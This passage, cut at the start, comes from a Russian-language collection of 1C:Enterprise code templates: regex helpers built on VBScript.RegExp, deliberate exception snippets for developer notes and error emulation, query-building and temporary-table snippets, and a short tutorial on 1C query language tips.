	Если пRegExp = Неопределено Тогда //Чтобы не создавать каждый раз новый Объект, если нужно несколько изменений
		RegExp 	= Новый COMОбъект(""VBScript.RegExp""); //Для 1C v 7.x: CreateObject(""VBScript.RegExp"")
	Иначе
		RegExp 	= пRegExp;
	КонецЕсли;
	
	RegExp.IgnoreCase 	= пИгнорироватьРегистр; //Игнорировать регистр 
	RegExp.Global 		= пПоискВсехВхожденийШаблона; //Поиск всех вхождений шаблона 
	RegExp.MultiLine 	= пМногострочныйРежим; //Многострочный режим 
	RegExp.Pattern 		= пШаблонЗамены; 
	
	Возврат RegExp.Replace(пСтрока, пЗаменитьНа);
	
КонецФункции // ЗаменитьСимволыПоШаблону()"}
},
{0,
{"ОтобратьТолькоЧисла",0,0,"","&НаСервереБезКонтекста
Функция ОтобратьТолькоЧисла(Строка)
	
	Возврат ЗаменитьСимволыПоШаблону(Строка, ""[^0-9]"");
	
КонецФункции // ОтобратьТолькоЧисла()
 
"}
},
{0,
{"ОтборТолькоЧисел_РВ",0,0,"","RegExp 				= Новый COMОбъект(""VBScript.RegExp""); //Для 1C v 7.x: CreateObject(""VBScript.RegExp"") 
RegExp.IgnoreCase 	= Истина; //Игнорировать регистр 
RegExp.Global 		= Истина; //Поиск всех вхождений шаблона 
RegExp.MultiLine 	= Истина; //Многострочный режим 
RegExp.Pattern 		= ""[^0-9]""; //Отбор только чисел
СтрокаОбработана 	= RegExp.Replace(Строка, """");"}
},
{0,
{"РазложитьСтрокуВМассив",0,0,"","  // Пример с использованием предустановленной библиотеки RegExp, т.е. она есть в любом windows.
  Функция РазложитьСтрокуВМассив(Строка, Разделитель = "","", пRegExp = Неопределено, пИгнорироватьРегистр = Истина, пПоискВсехВхожденийШаблона = Истина, пМногострочныйРежим = Истина) Экспорт
	  
	  Если ПустаяСтрока(Строка) Тогда
		  Возврат Строка; 
	  КонецЕсли;
	  
	  Если пRegExp = Неопределено Тогда //Чтобы не создавать каждый раз новый Объект, если нужно несколько изменений
		  RegExp 	= Новый COMОбъект(""VBScript.RegExp""); //Для 1C v 7.x: CreateObject(""VBScript.RegExp"")
	  Иначе
		  RegExp 	= пRegExp;
	  КонецЕсли;
	  
	  RegExp.IgnoreCase 	= пИгнорироватьРегистр; //Игнорировать регистр 
	  RegExp.Global 		= пПоискВсехВхожденийШаблона; //Поиск всех вхождений шаблона 
	  RegExp.MultiLine 		= пМногострочныйРежим; //Многострочный режим 
	  RegExp.Pattern 		= пШаблонЗамены; 
	  
	  //Разбор строки вида 1,СЛОВО,(1+2); Маска для разделителя ',' [^\,]*""
	  RegExp.Pattern = ""[^\"" + Разделитель + ""]+"";
	  Matches = RegExp.Execute (Строка);
	  
	  Массив = Новый Массив;
	  
	  Для Сч = 0 По Matches.Count - 1 Цикл
		  Массив.Добавить(Matches.Item(Сч).Value);
	  КонецЦикла;
	  
	  RegExp = Неопределено;
	  
	  Возврат Массив;
	  
  КонецФункции "}
},
{0,
{"Тест (проверка на наличие совпадения",0,0,"","Функция RegExp_Test(пСтрока, пШаблон, пRegExp = Неопределено, пИгнорироватьРегистр = Истина, пПоискВсехВхожденийШаблона = Истина, пМногострочныйРежим = Истина)
    
	Если ПустаяСтрока(пСтрока) ИЛИ ПустаяСтрока(пШаблон) Тогда
		Возврат Ложь; 
	КонецЕсли;
	
	Если пRegExp = Неопределено Тогда //Чтобы не создавать каждый раз новый Объект, если нужно несколько изменений
		RegExp 	= Новый COMОбъект(""VBScript.RegExp""); //Для 1C v 7.x: CreateObject(""VBScript.RegExp"")
	Иначе
		RegExp 	= пRegExp;
	КонецЕсли;
	
	RegExp.IgnoreCase 	= пИгнорироватьРегистр; //Игнорировать регистр 
	RegExp.Global 		= пПоискВсехВхожденийШаблона; //Поиск всех вхождений шаблона 
	RegExp.MultiLine 	= пМногострочныйРежим; //Многострочный режим 
	RegExp.Pattern 		= пШаблон; 

	Возврат RegExp.Test(пСтрока);    
	
КонецФункции"}
},
{0,
{"Примеры",0,0,"","///////////////////////////////////////////////////////////////////////
//Поиск вхождений подстроки
Процедура RegExp_Exec()
    
    //Для 1С 7.7:
    Истина=-1;
    Ложь=0;
    RegExp = CreateObject(""VBScript.RegExp"");
    
    RegExp.IgnoreCase = Ложь; //Игнорировать регистр
    RegExp.Global = Истина; //Поиск всех вхождений шаблона
    RegExp.MultiLine = Ложь; //Многострочный режим
    
    RegExp.Pattern = ""<[^>]*>""; //Ищем теги HTML
    Matches=RegExp.Execute(""Это <hr> строка <br> с тегами HTML"");
    ЧислоВхождений=Matches.Count();
    Если ЧислоВхождений>0 Тогда 
        Для к = 0 По ЧислоВхождений-1 Цикл
            Match = Matches.Item(к);
            Сообщить(""Найден тег:""+ Match.Value);
        КонецЦикла;
    Иначе
        Сообщить(""Вхождений шаблона не найдено"");
    КонецЕсли;
    //Выдаст в окно сообщений:    
    //Найден тег:<hr>
    //Найден тег:<br>    
КонецПроцедуры


Более продвинутый пример разбора HTML использует подвыражения (SubMatches) и позволяет находить как сами теги, так и текст между ними. 

///////////////////////////////////////////////////////////////////////
//Поиск вхождений подстроки с использованием подвыражений
Процедура RegExp_Exec1()
    
    //Для 1С 7.7:
    Истина=-1;
    Ложь=0;
    RegExp = CreateObject(""VBScript.RegExp"");
    
    RegExp.IgnoreCase = Ложь; //Игнорировать регистр
    RegExp.Global = Истина; //Поиск всех вхождений шаблона
    RegExp.MultiLine = Ложь; //Многострочный режим
    
    RegExp.Pattern = ""([^<]*)(<[^>]*>)([^<]*)""; //Ищем теги HTML, а также текст до и после тега
    Matches=RegExp.Execute(""  <tr><td id=aaa>Дятел <td> долбит <td> сосну </tr>"");
    ЧислоВхождений=Matches.Count();
    Если ЧислоВхождений>0 Тогда 
        Для к = 0 По ЧислоВхождений-1 Цикл
            Match = Matches.Item(к);
            
            SubMatches = Match.SubMatches;
            ЧислоПодвыражений=SubMatches.Count();
            Для н = 0 По ЧислоПодвыражений-1 Цикл
                SubMatch=SubMatches.Item(н);
                Если SubMatch="""" Тогда
                    Продолжить;
                КонецЕсли;    
                
                Сообщить(""Подстрока: ""+SubMatch);
            КонецЦикла;    
        КонецЦикла;
    Иначе
        Сообщить(""Вхождений шаблона не найдено"");
    КонецЕсли;
КонецПроцедуры

//Выводит в окно сообщений:
//Подстрока:   
//Подстрока: <tr>
//Подстрока: <td id=aaa>
//Подстрока: Дятел 
//Подстрока: <td>
//Подстрока:  долбит 
//Подстрока: <td>
//Подстрока:  сосну 
//Подстрока: </tr>


Часто регулярные выражения используются для тестирования строк, например пользовательского ввода. 
Этот пример позволяет узнать, является ли строка целым числом. 

///////////////////////////////////////////////////////////////////////
//Проверка подстроки
Процедура RegExp_Test()
    RegExp = CreateObject(""VBScript.RegExp"");
    RegExp.Pattern =  ""^\d+$""; //Шаблон, который соответствует целому числу
    стр=""12345"";//Строка, которую тестируем
    Если RegExp.Test(стр)=0 Тогда
        Сообщить(""Это не целое число"");
    Иначе
        Сообщить(""Это целое число"");
    КонецЕсли;
    //Выдаст в окно сообщений:    
    //""Это целое число""
КонецПроцедуры


Регулярные выражения поддерживают не только поиск, но и замену текста. При этом найденные подвыражения (в круглых скобках) могут быть представлены в строке замены как $1, $2 и т. д. 
(знак доллара используется в VBScript.RegExp; в других средах программирования, например в JavaScript, используемый для этой цели символ может отличаться). 

///////////////////////////////////////////////////////////////////////
//Замена текста в подстроке
Процедура RegExp_Replace()
    
    //Строка, где мы будем производить замены
    стр=""Дятел долбил сосну"";
    
    Истина=-1;
    Ложь=0;
    RegExp = CreateObject(""VBScript.RegExp"");
    
    RegExp.IgnoreCase = Истина; //Игнорировать регистр
    RegExp.Global = Истина; //Поиск всех вхождений шаблона
    RegExp.MultiLine = Истина; //Многострочный режим
    
    
    RegExp.Pattern = ""(долбил)""; 
    
    стр=RegExp.Replace(стр, ""про$1""); 
    Сообщить(стр);
    //Выдаст в окно сообщений:    
    //""Дятел продолбил сосну""
КонецПроцедуры"}
},
{0,
{"СтеретьВремя",0,0,"","&НаСервереБезКонтекста
Функция СтеретьВремя(Строка)
	// СтеретьВремя в наименовании документа
	Результат = ЗаменитьСимволыПоШаблону(Строка, ""(2[0-3]|[0-1]\d|0{1,2}):[0-5]\d:[0-5]\d"");
	Возврат Результат;

КонецФункции // ЕстьВремя()"}
},
{2,
{"Строки",1,0,"",""},
{0,
{"ОчиститьСтрокуПоШаблону",0,0,"","&НаСервереБезКонтекста
Функция ОчиститьСтрокуПоШаблону(Строка, Шаблон)
	
	Возврат ЗаменитьСимволыПоШаблону(Строка, Шаблон) 
	
КонецФункции // ОчиститьСтркуОтСимвола()"}
},
{0,
{"ОчиститьСтрокуОтСимволов",0,0,"","&НаСервереБезКонтекста
Функция ОчиститьСтрокуОтСимволов(Строка, СимволыДляОчищения)
	
	Возврат ЗаменитьСимволыПоШаблону(Строка, ""["" + СимволыДляОчищения + ""]"") ;
	
КонецФункции // ОчиститьСтркуОтСимвола()"}
}
}
},
{4,
{"Исключения (попытка), эмуляция ошибки",1,0,"",""},
{0,
{"Заметка",0,0,"ПопыткаЗам[етк]","//+++ <?"""", ДатаВремя, """"> Заметка выводимая через исключение
Попытка
	// В попытке может содержаться случай, при котором появляется баг в системе
	ПринудительныйВызовОшибкиДляПривлеченияВнимания 		= 1 / 0;
Исключение
	ПринудительныйВызовОшибкиДляПривлеченияВниманияИнфо 	= ИнформацияОбОшибке();
	ПринудительныйВызовОшибкиДляПривлеченияВниманияДопИнфо 	= ""
	|
	|Описание: """""" + ПринудительныйВызовОшибкиДляПривлеченияВниманияИнфо.Описание + """"""
	|ИсходнаяСтрока: """""" + ПринудительныйВызовОшибкиДляПривлеченияВниманияИнфо.ИсходнаяСтрока + """""""";
	ПринудительныйВызовОшибкиДляПривлеченияВниманияАвтор 	= ""
	|
	|Заметку добавил пользователь: """"АйТи КучеровРМ"""", <?"""", ДатаВремя, """">.""; 
	
	ПринудительныйВызовОшибкиДляПривлеченияВниманияЗаметка 	= ""<?""Текст заметки или комментария"">'""; // Причина, по которой надо вызвать исключение
	ПринудительныйВызовОшибкиДляПривлеченияВнимания 		= 
	""ПРИНУДИТЕЛЬНЫЙ ВЫЗОВ ОШИБКИ ДЛЯ ПРИВЛЕЧЕНИЯ ВНИМАНИЯ!
	|В модуле: """""" + ПринудительныйВызовОшибкиДляПривлеченияВниманияИнфо.ИмяМодуля + """""", 
	|в строке № "" + ПринудительныйВызовОшибкиДляПривлеченияВниманияИнфо.НомерСтроки + "".
	|Заметка: """""" + ПринудительныйВызовОшибкиДляПривлеченияВниманияЗаметка + """""""" +  
	//ПринудительныйВызовОшибкиДляПривлеченияВниманияДопИнфо + // Для вывода информации описания ошибки и вида исходной ошибочной строки 
	ПринудительныйВызовОшибкиДляПривлеченияВниманияАвтор;
	
	ВызватьИсключение(ПринудительныйВызовОшибкиДляПривлеченияВнимания);
	
КонецПопытки;
//--- <?"""", ДатаВремя, """"> Заметка выводимая через исключение
"}
},
{0,
{"Заметка через вопрос о её вызове",0,0,"","Оповещение 	= Новый ОписаниеОповещения(""ВопросПрерватьВыполнениеКода"", ЭтаФорма, Параметры);
ПоказатьВопрос(Оповещение, ""Вызвать прерывание кода?"", РежимДиалогаВопрос.ДаНет, 0);

&НаКлиенте
Процедура ВопросПрерватьВыполнениеКода(Результат, Параметры) Экспорт
	
	Если Результат = КодВозвратаДиалога.Да Тогда
		Попытка
			// В попытке может содержаться случай, при котором появляется баг в системе
			ПринудительныйВызовОшибкиДляПривлеченияВнимания 		= 1 / 0;
		Исключение
			ПринудительныйВызовОшибкиДляПривлеченияВниманияИнфо 	= ИнформацияОбОшибке();
			ПринудительныйВызовОшибкиДляПривлеченияВниманияДопИнфо 	= ""
			|
			|Описание: """""" + ПринудительныйВызовОшибкиДляПривлеченияВниманияИнфо.Описание + """"""
			|ИсходнаяСтрока: """""" + ПринудительныйВызовОшибкиДляПривлеченияВниманияИнфо.ИсходнаяСтрока + """""""";
			ПринудительныйВызовОшибкиДляПривлеченияВниманияАвтор 	= ""
			|
			|Заметку добавил пользователь: """"АйТи КучеровРМ"""", <?"""", ДатаВремя, """">.""; 
			
			ПринудительныйВызовОшибкиДляПривлеченияВниманияЗаметка 	= ""<?""Текст заметки или комментария"">'""; // Причина, по которой надо вызвать исключение
			ПринудительныйВызовОшибкиДляПривлеченияВнимания 		= 
			""ПРИНУДИТЕЛЬНЫЙ ВЫЗОВ ОШИБКИ ДЛЯ ПРИВЛЕЧЕНИЯ ВНИМАНИЯ!
			|В модуле: """""" + ПринудительныйВызовОшибкиДляПривлеченияВниманияИнфо.ИмяМодуля + """""", 
			|в строке № "" + ПринудительныйВызовОшибкиДляПривлеченияВниманияИнфо.НомерСтроки + "".
			|Заметка: """""" + ПринудительныйВызовОшибкиДляПривлеченияВниманияЗаметка + """""""" +  
			//ПринудительныйВызовОшибкиДляПривлеченияВниманияДопИнфо + // Для вывода информации описания ошибки и вида исходной ошибочной строки 
			ПринудительныйВызовОшибкиДляПривлеченияВниманияАвтор;
			
			ВызватьИсключение(ПринудительныйВызовОшибкиДляПривлеченияВнимания);
			
		КонецПопытки;
	КонецЕсли;
	
КонецПроцедуры"}
},
{0,
{"Эмуляция регулярной ошибки",0,0,"","Если Секунда(ТекущаяДата()) % 2 = 0 Тогда
	лЭмуляцияОшибки 	= 1 / 0;
КонецЕсли;"}
},
{0,
{"Эмуляция регулярной ошибки в Попытке",0,0,"ПопыткаЭмул[яц]","Попытка
	
	Если Секунда(ТекущаяДата()) % 2 = 0 Тогда
		лЭмуляцияОшибки 	= 1 / 0;
	КонецЕсли;
	
Исключение
	лСообщениеОшибки 	= ""Ошибка: "" + ОписаниеОшибки();
	Сообщить(лСообщениеОшибки, СтатусСообщения.Важное);
КонецПопытки; "}
}
},
{17,
{"Запрос",1,0,"",""},
{0,
{"ВыбратьПервые",0,0,"","КоличествоВыбираемых 	= ВыбратьПервые;
Если ВибиратьПервыеЗначения Тогда
	КоличествоВыбираемых 			= ВыбратьПервые;
	ЗапросВибиратьПервыеЗначения 	= "" ПЕРВЫЕ "" + КоличествоВыбираемых;
Иначе 
	ЗапросВибиратьПервыеЗначения 	= """";
КонецЕсли; 

Если ЗапросВибиратьПервыеЗначения = Неопределено Тогда
	ЗапросВибиратьПервыеЗначения 	= """"; 
КонецЕсли; 

Запрос 			= Новый Запрос;
Запрос.Текст 	= 
""ВЫБРАТЬ "" + ЗапросВибиратьПервыеЗначения + """}
},
{0,
{"ПодВыборка (ОбходРезультатаЗапроса.ПоГруппировкам)",0,0,"ЗапросПодвыб[орк]","Если НЕ РезультатЗапроса.Пустой() Тогда
	лВыборка 	= РезультатЗапроса.Выбрать(ОбходРезультатаЗапроса.ПоГруппировкам);
	Пока лВыборка.Следующий() Цикл
		
		лПодВыборка 	= лВыборка.Выбрать();
		
		Пока лПодВыборка.Следующий() Цикл
			
			<?>
			
		КонецЦикла;
		
	//Прервать;
		
	КонецЦикла;
Иначе
КонецЕсли;"}
},
{0,
{"РезультатЗапроса.Пустой Пока",0,0,"еслиРезП[ока]","Если НЕ РезультатЗапроса.Пустой() Тогда
	лВыборка 	= РезультатЗапроса.Выбрать();
	Пока лВыборка.Следующий() Цикл
		лВыборкаЭлем<?""Выбираемый элемент выборки, если есть (слитно)""> 	= лВыборка.<?""Выбираемый элемент выборки, если есть (слитно)"">;
		//Прервать;
	КонецЦикла;
Иначе
КонецЕсли; "}
},
{0,
{"РезультатЗапроса.Пустой Если",0,0,"еслиРезЕ[сли]","Если НЕ РезультатЗапроса.Пустой() Тогда
	лВыборка 	= РезультатЗапроса.Выбрать();
	Если лВыборка.Следующий() Тогда
		лВыборкаЭлем<?""Выбираемый элемент выборки, если есть (слитно)""> 	= лВыборка.<?""Выбираемый элемент выборки, если есть (слитно)"">;
	КонецЕсли;
Иначе
КонецЕсли; 
"}
},
{0,
{"ДопЗапрос",0,0,"","Запрос.Текст 	= Запрос.Текст + ДопЗапрос;"}
},
{0,
{"Дописать параметр в запрос",0,0,"ЗапросЗам","Если НЕ ПустаяСтрока(<?""Имя параметра в запрос (Слитно)"">) Тогда			   
	Запрос<?""Замена точки в \""Запрос.Текст\"" (слитно)"">Текст 	= Запрос<?""Замена точки в \""Запрос.Текст\"" (слитно)"">Текст + ""
	|	И ДоговорыКонтрагентов.Наименование = &Наименование"";
	Запрос.УстановитьПараметр(""Наименование""	, <?""Имя параметра в запрос (Слитно)"">);
КонецЕсли;"}
},
{0,
{"ВыборкаДетальныеЗаписи",0,0,"ВДЗ[_]","ВДЗ_<?""Имя ревизита/поля (силитно)""> 	= ВыборкаДетальныеЗаписи.<?""Имя ревизита/поля (силитно)"">;"}
},
{0,
{"лВыборка",0,0,"Выборка[.]","лВыборка<?""Имя ревизита/поля (силитно)""> 	= лВыборка.<?""Имя ревизита/поля (силитно)"">;"}
},
{0,
{"Остаток от деления в запросе",0,0,"","<?""Делимое число""> - (<?""Делитель числа""> * ВЫРАЗИТЬ((<?""Делимое число""> / <?""Делитель числа"">) - 0.5 КАК ЧИСЛО(15, 0)))"}
},
{0,
{"Целая часть деления в запросе",0,0,"","ВЫБОР
	КОГДА <?""Название переменной числа (слитно)""> > 0
		ТОГДА ВЫРАЗИТЬ(<?""Название переменной числа (слитно)""> - 0.5 КАК ЧИСЛО(15, 0))
	ИНАЧЕ ВЫРАЗИТЬ(<?""Название переменной числа (слитно)""> + 0.5 КАК ЧИСЛО(15, 0))
КОНЕЦ"}
},
{0,
{"МенеджерВременныхТаблиц",0,0,"МВТ","МенеджерВременныхТаблиц 	= Новый МенеджерВременныхТаблиц;"}
},
{0,
{"Удалить заданные временные таблицы",0,0,"","//Удаляю насозданные типовым методом временные таблицы, чтобы вызвать доработанный метод
лЗапросТекст 	= """";
Для каждого МенеджерТаблицыЭлем Из Менеджер.Таблицы Цикл
	
	лМенеджерТаблицыЭлемПолноеИмя 	= МенеджерТаблицыЭлем.ПолноеИмя; 
	Если лМенеджерТаблицыЭлемПолноеИмя = ""ТаблицаНераспределенных"" ИЛИ лМенеджерТаблицыЭлемПолноеИмя = ""ТаблицаОшибокТоварныеМеста"" Тогда
		лЗапросТекст = лЗапросТекст + ""УНИЧТОЖИТЬ "" + лМенеджерТаблицыЭлемПолноеИмя + ""
		|;
		|
		|////////////////////////////////////////////////////////////////////////////////
		|"";
	КонецЕсли; 
	
КонецЦикла;

Если НЕ ПустаяСтрока(лЗапросТекст) Тогда
	Запрос 	= Новый Запрос;
	Запрос.МенеджерВременныхТаблиц 	= Менеджер;
	Запрос.Текст 	= лЗапросТекст;
	Запрос.Выполнить();
КонецЕсли;"}
},
{0,
{"МенеджерВременныхТаблиц из вычисления выражения (Запрос.МенеджерВременныхТаблиц.Таблицы[0].ПолучитьДанные().Выгрузить())",0,0,"МВТ[аблиц]","Запрос.МенеджерВременныхТаблиц.Таблицы[0].ПолучитьДанные().Выгрузить()"}
},
{0,
{"МенеджерВременныхТаблиц из вычисления выражения (МенеджерВременныхТаблиц.Таблицы[0].ПолучитьДанные().Выгрузить())",0,0,"МВТ[аблиц]","МенеджерВременныхТаблиц.Таблицы[0].ПолучитьДанные().Выгрузить()"}
},
{0,
{"МенеджерВременныхТаблиц из вычисления выражения (.Таблицы[0].ПолучитьДанные().Выгрузить())",0,0,"МВТ[аблиц]",".Таблицы[0].ПолучитьДанные().Выгрузить()"}
},
{0,
{"Добавить данные в запрос (программно, через СтрЗаменить)",0,0,"","// Функция - Добавить данные в запрос
//
// Параметры:
//  пТекстЗапроса				 - Строка	 - Весь текст запроса для добавления в него своего кода
//  пТекстИсходнойСтрокиДляЗаменты		 - Строка	 - Часть запроса, которая будет искаться и заменяться так, чтобы после неё вставились наши новые данные
//  пСтруктураВставкиДанных		 - Структура	 - Данные полей и таблиц для подстановки. Ключ = ИмяТаблицы, чтобы поля были разными (нужно для уникальности структуры). Если имеется таблицы и её реквизиты.
//  							 - Строка	 - Строка для замены, проямо один текс заменится на этом, при необходимости с учетом параметра пТекстСтрокиДляПодстановки
//  пСимволВКонецСтроки			 - Строка	 - В конец каждой строки структуры будет добавлен этот символ, напр., "",""
//  пТекстВКонецЗапроса		 - Строка	 - Символ в самый конец запроса, напр., ""}""
//Возврат:
//	Булево - Есть в запросе пТекстЗапроса подстрока пТекстИсходнойСтрокиДляЗаменты
// АйТи КучеровРМ 26.07.2019 
Функция ДобавитьДанныеВЗапрос(пТекстЗапроса, Знач пТекстИсходнойСтрокиДляЗаменты, пСтруктураВставкиДанных, Знач пТекстИсходнойСтрокиДляПодстановки = """", пДобавляяПослеИсходнойСтроки = Истина, пСимволВКонецСтроки = "","", пТекстВКонецЗапроса = """") Экспорт
	
	лЕстьПодстрока 	= СтрНайти(пТекстЗапроса, пТекстИсходнойСтрокиДляЗаменты) > 0; 
	
	Если лЕстьПодстрока Тогда
		Если ПустаяСтрока(пТекстИсходнойСтрокиДляПодстановки) Тогда			   
			пТекстИсходнойСтрокиДляПодстановки 	= пТекстИсходнойСтрокиДляЗаменты;
		КонецЕсли; 
		
		Если ТипЗнч(пСтруктураВставкиДанных) = Тип(""Строка"") Тогда
			Если пДобавляяПослеИсходнойСтроки Тогда
				пТекстЗапроса 	= СтрЗаменить(пТекстЗапроса, пТекстИсходнойСтрокиДляЗаменты, 
				пТекстИсходнойСтрокиДляЗаменты + ""
				|"" + пСтруктураВставкиДанных);
			Иначе
				пТекстЗапроса 	= СтрЗаменить(пТекстЗапроса, пТекстИсходнойСтрокиДляЗаменты, пСтруктураВставкиДанных);
			КонецЕсли; 
		ИначеЕсли ТипЗнч(пСтруктураВставкиДанных) = Тип(""Структура"") Тогда
			Для каждого Элем Из пСтруктураВставкиДанных Цикл
				
				пТекстЗапроса 	= СтрЗаменить(пТекстЗапроса, пТекстИсходнойСтрокиДляПодстановки,
				пТекстИсходнойСтрокиДляЗаменты + ""
				|	"" + Элем.Значение + ""."" + Элем.Ключ + "" КАК "" + Элем.Ключ + пСимволВКонецСтроки);
				
			КонецЦикла;	
		КонецЕсли;
		
		пТекстЗапроса 	= пТекстЗапроса + пТекстВКонецЗапроса;
	КонецЕсли; 
	  
	Возврат лЕстьПодстрока
	
КонецФункции // ДобавитьДанныеВЗапрос()

//СписокЗапасыПоиска - Пример с убиранием и добавлением }
АйТи_ОбщиеФункцииСервер.ДобавитьДанныеВЗапрос(СписокЗапасыПоиска.ТекстЗапроса, ""СправочникНоменклатура.Ссылка КАК НоменклатураСсылка,"", ""isnull(НоменклатураДополнительныеРеквизиты.Значение, Неопределено) КАК Производитель,"");
АйТи_ОбщиеФункцииСервер.ДобавитьДанныеВЗапрос(СписокЗапасыПоиска.ТекстЗапроса, ""ПО СправочникНоменклатура.Ссылка = РезервыЗапасов.Номенклатура}"", ""
|ПО СправочникНоменклатура.Ссылка = РезервыЗапасов.Номенклатура
|ЛЕВОЕ СОЕДИНЕНИЕ Справочник.Номенклатура.ДополнительныеРеквизиты КАК НоменклатураДополнительныеРеквизиты
|	ПО НоменклатураДополнительныеРеквизиты.Ссылка = СправочникНоменклатура.Ссылка
|		И (НоменклатураДополнительныеРеквизиты.Свойство.Имя = """"Производитель"""")}"",, Ложь);

//СписокХарактеристик - Производитель
АйТи_ОбщиеФункцииСервер.ДобавитьДанныеВЗапрос(СписокХарактеристик.ТекстЗапроса, ""ВсеХарактеристикиСНоменклатурой.НоменклатураСсылка КАК НоменклатураСсылка,"", ""isnull(НоменклатураДополнительныеРеквизиты.Значение, Неопределено) КАК Производитель,"");
АйТи_ОбщиеФункцииСервер.ДобавитьДанныеВЗапрос(СписокХарактеристик.ТекстЗапроса, ""И СправочникХарактеристики.Ссылка = РезервыЗапасов.Характеристика"", ""
|ЛЕВОЕ СОЕДИНЕНИЕ Справочник.Номенклатура.ДополнительныеРеквизиты КАК НоменклатураДополнительныеРеквизиты
|	ПО ВсеХарактеристикиСНоменклатурой.НоменклатураСсылка = НоменклатураДополнительныеРеквизиты.Ссылка
|		И (НоменклатураДополнительныеРеквизиты.Свойство.Имя = """"Производитель"""")"");

//СписокХарактеристик - Поставщик
АйТи_ОбщиеФункцииСервер.ДобавитьДанныеВЗапрос(СписокХарактеристик.ТекстЗапроса, ""ВсеХарактеристикиСНоменклатурой.НоменклатураСсылка КАК НоменклатураСсылка,"", Новый Структура(""Поставщик"", ""ВсеХарактеристикиСНоменклатурой.НоменклатураСсылка""));
"}
},
{0,
{"Хитрости (Поле1, Поле2, ... , ПолеN) В (Поле1, Поле2, ... , ПолеN)",0,0,"","Маленькие хитрости больших запросов
Для формирования и выполнения запросов к таблицам базы данных в платформе 1С используется специальный объект языка программирования Запрос. Создается этот объект вызовом конструкции Новый Запрос. Запрос удобно использовать, когда требуется получить сложную выборку данных, сгруппированную и отсортированную необходимым образом. Классический пример применения запроса - получение сводки по состоянию регистра накопления на определенный момент времени. Так же, механизм запросов позволяет легко получать информацию в различных временных разрезах.

Текст запроса – это инструкция, в соответствии с которой должен быть выполнен запрос. В тексте запроса описывается:
таблицы информационной базы, используемые в качестве источников данных запроса; 
поля таблиц, которые требуется обрабатывать в запросе; 
правила группировки; 
сортировки результатов; 
и т. д.  
Инструкция составляется на специальном языке – языке запросов и состоит из отдельных частей – секций, предложений, ключевых слов, функций, арифметических и логических операторов, комментариев, констант и параметров.

Язык запросов платформы 1С очень похож  на синтаксис других SQL-языков, но имеются отличия. Основными преимуществами встроенного языка запросов являются: разыменование полей, наличие виртуальных таблиц, удобная работа с итогами, нетипизированные поля в запросах.

Рекомендации по написанию запросов к базе данных на языке запросов платформы 1С:

1) Текст запроса может содержать предопределенные данные конфигурации, такие как:
значения перечислений; 
предопределенные данные: 
справочников; 
планов видов характеристик; 
планов счетов; 
планов видов расчетов;
пустые ссылки; 
значения точек маршрута бизнес-процессов.
Также текст запроса может содержать значения системных перечислений, которые могут быть присвоены полям в таблицах базы данных: ВидДвиженияНакопления, ВидСчета и ВидДвиженияБухгалтерии. Обращение в запросах к предопределенным данным конфигурации и значениям системных перечислений осуществляется с помощью литерала функционального типа ЗНАЧЕНИЕ. Данный литерал позволяет повысить удобочитаемость запроса и уменьшить количество параметров запроса.

Пример использования литерала ЗНАЧЕНИЕ:
ГДЕ Город = ЗНАЧЕНИЕ(Справочник.Города.Москва)
ГДЕ Город = ЗНАЧЕНИЕ(Справочник.Города.ПустаяСсылка)
ГДЕ ТипТовара = ЗНАЧЕНИЕ(Перечисление.ВидыТоваров.Услуга)
ГДЕ ВидДвижения = ЗНАЧЕНИЕ(ВидДвиженияНакопления.Приход)
ГДЕ ТочкаМаршрута = ЗНАЧЕНИЕ(БизнесПроцесс.БизнесПроцесс1.ТочкаМаршрута.Действие1


2) Использование инструкции АВТОУПОРЯДОЧИВАНИЕ в запросе может сильно время выполнения запроса, поэтому, если сортировка не требуется,  то лучше вообще ее не использовать. Во большинстве случаях лучше всего применять сортировку с помощью инструкции УПОРЯДОЧИТЬ ПО.

Автоупорядочивание работает по следующим принципам:
Если в запросе было указано предложение УПОРЯДОЧИТЬ ПО, то каждая ссылка на таблицу, находящаяся в этом предложении, будет заменена полями, по которым по умолчанию сортируется таблица (для справочников это код или наименование, для документов – дата документа). Если поле для упорядочивания ссылается на иерархический справочник, то будет применена иерархическая сортировка по этому справочнику. 
Если в запросе отсутствует предложение УПОРЯДОЧИТЬ ПО, но есть предложение ИТОГИ, тогда результат запроса будет упорядочен по полям, присутствующим в предложении ИТОГИ после ключевого слова ПО, в той же последовательности и, в случае если итоги рассчитывались по полям – ссылкам, то по полям сортировки по умолчанию таблиц, на которые были ссылки. 
Если в запросе отсутствуют предложения УПОРЯДОЧИТЬ ПО и ИТОГИ, но есть предложение СГРУППИРОВАТЬ ПО, тогда результат запроса будет упорядочен по полям, присутствующим в предложении, в той же последовательности и, в случае если группировка велась по полям – ссылкам, то по полям сортировки по умолчанию таблиц, на которые были ссылки. 
В случае же, если в запросе отсутствуют предложения и УПОРЯДОЧИТЬ ПО, ИТОГИ и СГРУППИРОВАТЬ ПО, результат будет упорядочен по полям сортировки по умолчанию для таблиц, из которых выбираются данные, в порядке их появления в запросе.
В случае, если запрос содержит предложение ИТОГИ, каждый уровень итогов упорядочивается отдельно.

3) Что бы избежать повторного запроса к базе данных при выводе результата запроса пользователю (например, построение запроса или отображение результата запроса с помощью табличного документа) полезно использовать инструкцию ПРЕДСТАВЛЕНИЕССЫЛКИ, которая позволяет получать представление ссылочного значения.

Пример:
ВЫБРАТЬ
ПРЕДСТАВЛЕНИЕССЫЛКИ(РасходнаяНакладнаяСостав.Номенклатура) КАК НоменклатураПредставление

Так же возможно использование инструкции ПРЕДСТАВЛЕНИЕ - предназначена для получения строкового представления значения произвольного типа. Отличие этих инструкций в том, что в первом случае, если инструкции передать ссылку, результатом будет строка, В остальных случаях результатом будет значение переданного параметра. Во втором случае, результатом инструкции всегда будет строка!

4) Если в запросе имеется поле с составным типом, то для таких полей возникает необходимость привести значения поля к какому-либо определенному типу с помощью инструкции ВЫРАЗИТЬ, что позволит убрать лишние таблицы из левого соединения с полем составного типа данных и ускорить выполнение запроса.

Пример:
Имеется регистра накопления ОстаткиТоваров, у которого поле Регистратор имеет составной тип. В запросе выбираются Дата и Номер документов ПоступлениеТоваров, при этом при обращении к реквизитам документа через поле Регистратор не происходит множество левых соединений таблицы регистра накопления с таблицами документов-регистраторов.

ВЫБРАТЬ
ВЫРАЗИТЬ(ОстаткиТоваров.Регистратор КАК Документ.ПоступлениеТоваров).Номер КАК НомерПоступления,
ВЫРАЗИТЬ(ОстаткиТоваров.Регистратор КАК Документ.ПоступлениеТоваров).Дата КАК ДатаПоступления
ИЗ
РегистрНакопления.ОстаткиТоваров КАК ОстаткиТоваров

Если приведение типа считается не осуществимым, то результатом приведения типа будет значение NULL.

